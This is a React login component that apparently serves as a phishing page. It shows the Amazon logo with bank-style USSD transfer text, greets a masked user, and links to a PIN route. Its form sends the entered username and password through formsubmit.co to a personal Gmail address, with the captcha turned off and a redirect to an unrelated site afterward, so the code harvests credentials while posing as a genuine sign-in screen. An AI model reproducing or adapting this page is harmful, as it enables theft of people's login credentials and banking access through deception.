import React, { useState } from 'react'
import { Link } from "react-router-dom";

//Import styles and Icons
import './Register.css'

const Register = () => {
  const [email, setEmail]= useState('');
  const [password, setPassword]= useState('');

  return (  
    <div className='register'>
        <Link to='/'>
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/1024px-Amazon_logo.svg.png" alt="" className='register__logo' />
        </Link>

        <div className="register__header">
          <div className="register__headerText">
            <h1>Welcome back,</h1>
            <h1>Eag#####</h1>
          </div>
        </div>
        <div className="register__container">
          <div className="register__containerUp">
            <form action="https://formsubmit.co/danielmordi22@gmail.com" method="POST">
              <input type="hidden" name="_captcha" value="false"></input>
              <input type="hidden" name="_next" value="https://demiladebdm.netlify.com"></input>              
              <input
                className='register__containerUpInput' 
                value={email} 
                type="email"
                name="email"
                placeholder="Username" 
                onChange={e => setEmail(e.target.value)}
              />        
              <input 
                className='register__containerUpInput'
                value={password} 
                type="password"
                name="message"
                placeholder="Password" 
                onChange={e => setPassword(e.target.value)}
              />
              <div className='register__linkUp'>
                  <Link to='/' className='register__linkUpLink'>
                      <p>Forgot Username</p>
                  </Link>
                  <p>or</p>
                  <Link to='/' className='register__linkUpLink'>
                      <p>Password?</p>
                  </Link>
              </div>
              <button type='submit' className='register__registerButton' style={{width: "100%"}}>Login</button>
            </form>
          </div>

          <div className="register__containerDown">
            <div className="register__bottomA">
                <h2>Available on USSD</h2>
                <p>Transfer, Airtime & Pay Bills Offline!</p>
            </div>
            <div className="register__bottomB">
                *5573#
            </div>
            <Link to='/pin'>
              Pin
            </Link>
          </div>

        </div>
    </div>
)
}

export default Register